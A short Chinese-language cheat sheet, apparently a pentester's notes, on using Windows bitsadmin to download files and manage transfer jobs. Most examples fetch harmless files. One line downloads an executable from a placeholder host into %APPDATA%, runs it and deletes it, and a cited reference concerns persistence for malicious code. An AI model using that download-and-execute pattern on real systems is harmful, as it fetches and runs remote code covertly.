bitsadmin命令（只能命令下载到已存在的路径上，win7以上）：



https://xz.aliyun.com/t/1654/

1.```bitsadmin /transfer n http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg e:\a.jpg```  # 带进度条

2.```bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip e:\p.zip```

3.```bitsadmin /rawreturn /transfer getpayload http://download.sysinternals.com/files/PSTools.zip e:\p.zip```

4.带进度条

```bitsadmin /transfer myDownLoadJob /download /priority normal "http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg" "e:\abc.jpg"```

![](bitsadmin/1.jpg)

5.多条命令(测试失败)
 
``` 
bitsadmin /create myDownloadJob
bitsadmin /addfile myDownloadJob http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg e:\abc.jpg
bitsadmin /resume myDownloadJob
bitsadmin /info myDownloadJob /verbose
bitsadmin /complete myDownloadJob
```

bitsadmin /list /allusers /verbose  #列出所有任务(如果列所有用户需管理员权限）

bitsadmin /list /verbose         #列出所有任务

bitsadmin /cancel myDownloadJob   #删除某个任务


未知

	bitsadmin /transfer d90f <http://site.com/a> %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe


参考

[使用Bitsadmin 命令下载文件](https://www.cnblogs.com/hookjoy/p/6550992.html)

[使用计划任务和bitsadmin实现恶意代码长期控守](https://blog.csdn.net/qq_31481187/article/details/57540231)


## 后记

1.缺点：要输入绝对路径

2.bitsadmin 下载文件后默认的文件修改时间很有趣：

![](bitsadmin/2.jpg)